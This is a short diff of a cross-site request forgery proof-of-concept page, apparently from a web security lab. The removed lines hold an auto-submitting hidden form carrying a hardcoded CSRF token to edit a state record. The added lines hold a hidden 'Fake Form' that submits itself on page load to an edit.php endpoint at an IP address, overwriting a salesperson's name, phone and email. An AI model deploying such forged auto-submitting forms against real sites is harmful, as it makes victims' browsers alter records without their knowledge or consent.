@@ -1,7 +1,14 @@
-<form action="/red/public/staff/states/edit.php?id=9" method="POST"> 
-<input type="hidden" name="csrf_token" value="9d5b2f4a5ed053040c68b71bb1b7061b" /> 
-<input type="hidden" name="name" value="Floridaaa" /> 
-<input type="hidden" name="code" value="FL" /> <
-input type="hidden" name="country_id" value="1" /> 
-<input type="hidden" name="submit" value="Update" /> </form> 
-<script> document.forms[0].submit(); </script>
+<html>
+  <head>
+    <title>Fake Form</title>
+  </head>
+  <body onload="document.test.submit()">
+    <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=8" method="POST" name="test" style="display: none;">
+        <input type="hidden" name="first_name" value="hellooooo" />
+        <input type="hidden" name="last_name" value="sunshineeeee" />
+        <input type="hidden" name="phone" value="8675309" />
+        <input type="hidden" name="email" value="sunshine@salesperson.com" />
+        <input type="submit" value="Update"/>
+    </form>
+  </body>
+</html>
